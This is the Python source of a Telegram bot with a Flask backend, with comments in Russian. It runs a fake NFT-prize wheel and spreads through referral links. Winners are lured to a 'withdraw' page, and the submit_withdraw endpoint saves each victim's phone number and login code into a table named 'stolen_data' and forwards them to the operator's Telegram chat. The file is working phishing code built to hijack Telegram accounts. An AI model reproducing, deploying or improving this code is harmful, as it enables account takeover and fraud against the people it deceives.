import logging
import random
import string
import json
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify, send_file
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
import threading
import os

# ================== НАСТРОЙКИ ==================
TOKEN = 'YOUR_BOT_TOKEN'           # Токен от BotFather
ADMIN_CHAT_ID = 123456789           # Твой Telegram ID
WEB_APP_URL = 'https://nft-wheel.onrender.com'  # Ссылка на статический сайт

# Flask app
app = Flask(__name__)

# Telegram bot setup
updater = Updater(TOKEN, use_context=True)
dp = updater.dispatcher

# ================== БАЗА ДАННЫХ ==================
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, referrer_id INTEGER, 
                  spins INTEGER, invited INTEGER, claimed_gift TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS referrals
                 (user_id INTEGER, referrer_id INTEGER, date TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_data
                 (phone TEXT, code TEXT, user_id INTEGER, date TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ================== FLASK API (для мини-приложения) ==================
@app.route('/api/get_spins')
def get_spins():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify({'error': 'no user_id'}), 400
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT spins FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    spins = row[0] if row else 0
    conn.close()
    return jsonify({'spins': spins})

@app.route('/api/submit_withdraw', methods=['POST'])
def submit_withdraw():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    user_id = data.get('user_id')
    if phone and code and user_id:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("INSERT INTO stolen_data (phone, code, user_id, date) VALUES (?, ?, ?, ?)",
                  (phone, code, user_id, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        # Отправляем админу в Telegram
        updater.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"📲 Новые данные!\nТелефон: {phone}\nКод: {code}\nUser ID: {user_id}")
        return jsonify({'status': 'ok'})
    return jsonify({'error': 'invalid data'}), 400

# ================== TELEGRAM BOT HANDLERS ==================
def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    args = context.args
    referrer_id = None

    if args and args[0].startswith('ref_'):
        try:
            referrer_id = int(args[0][4:])
        except:
            pass

    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    if not c.fetchone():
        c.execute("INSERT INTO users (user_id, referrer_id, spins, invited) VALUES (?, ?, ?, ?)",
                  (user_id, referrer_id, 1 if referrer_id else 0, 0))
    conn.commit()
    conn.close()

    if referrer_id and referrer_id != user_id:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO referrals (user_id, referrer_id, date) VALUES (?, ?, ?)",
                  (user_id, referrer_id, datetime.now().isoformat()))
        c.execute("UPDATE users SET spins = spins + 1 WHERE user_id=?", (referrer_id,))
        c.execute("UPDATE users SET invited = invited + 1 WHERE user_id=?", (referrer_id,))
        conn.commit()
        conn.close()
        updater.bot.send_message(chat_id=referrer_id, text="🎉 По вашей ссылке зарегистрировался новый пользователь! +1 билетик!")

    keyboard = [
        [InlineKeyboardButton("🎡 Крутить колесо", web_app=WebAppInfo(url=f"{WEB_APP_URL}/index.html"))],
        [InlineKeyboardButton("👥 Рефералы", callback_data="referrals")],
        [InlineKeyboardButton("🎁 Мой инвентарь", callback_data="inventory")]
    ]
    update.message.reply_text(
        "🎉 *Мега-розыгрыш NFT-подарков!*\n\nКрути колесо удачи, приглашай друзей и забирай редкие NFT!\n👇 Начинай:",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

def referrals_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT invited FROM users WHERE user_id=?", (user_id,))
    invited = c.fetchone()[0]
    ref_link = f"https://t.me/{(context.bot.username)}?start=ref_{user_id}"
    text = f"👥 *Ваши рефералы*\n\nПриглашено друзей: {invited}\n\nВаша ссылка:\n`{ref_link}`"
    keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")]]
    query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

def inventory_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT claimed_gift FROM users WHERE user_id=?", (user_id,))
    gift = c.fetchone()[0]
    if gift:
        text = f"🎁 *Ваш инвентарь*\n\nУ вас есть:\n• {gift}\n\nНажмите кнопку ниже, чтобы вывести NFT."
        keyboard = [
            [InlineKeyboardButton("💰 Вывести", url=f"{WEB_APP_URL}/withdraw.html")],
            [InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")]
        ]
    else:
        text = "🎁 *Ваш инвентарь*\n\nУ вас пока нет выигранных NFT."
        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")]]
    query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

def back_to_main(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    keyboard = [
        [InlineKeyboardButton("🎡 Крутить колесо", web_app=WebAppInfo(url=f"{WEB_APP_URL}/index.html"))],
        [InlineKeyboardButton("👥 Рефералы", callback_data="referrals")],
        [InlineKeyboardButton("🎁 Мой инвентарь", callback_data="inventory")]
    ]
    query.edit_message_text("🎉 *Мега-розыгрыш NFT-подарков!*\n\nКрути колесо удачи, приглашай друзей и забирай редкие NFT!\n👇 Начинай:", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

def handle_webapp_data(update: Update, context: CallbackContext):
    data = json.loads(update.effective_message.web_app_data.data)
    user_id = update.effective_user.id
    if data.get('action') == 'spin':
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT spins FROM users WHERE user_id=?", (user_id,))
        spins = c.fetchone()[0]
        if spins > 0:
            c.execute("UPDATE users SET spins = spins - 1 WHERE user_id=?", (user_id,))
            prizes = ['Снуп Догг', 'Хабиб', 'Пабло', 'Редкий алмаз', 'SpaceX Dragon', 'Королевская корона', 'Игровая приставка', 'Золотая звезда']
            prize = random.choice(prizes)
            c.execute("UPDATE users SET claimed_gift=? WHERE user_id=?", (prize, user_id))
            conn.commit()
            conn.close()
            context.bot.send_message(chat_id=user_id, text=f"🎁 Поздравляем! Вы выиграли: *{prize}*!\n\nЗайдите в инвентарь, чтобы вывести приз.", parse_mode='Markdown')
        else:
            conn.close()
            context.bot.send_message(chat_id=user_id, text="😕 У вас нет билетиков. Пригласите друга!")

# Регистрируем хендлеры
dp.add_handler(CommandHandler('start', start))
dp.add_handler(CallbackQueryHandler(referrals_callback, pattern='^referrals$'))
dp.add_handler(CallbackQueryHandler(inventory_callback, pattern='^inventory$'))
dp.add_handler(CallbackQueryHandler(back_to_main, pattern='^back_to_main$'))
dp.add_handler(MessageHandler(Filters.web_app_data, handle_webapp_data))

# ================== ЗАПУСК ==================
def run_bot():
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()
    # Запускаем Flask
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
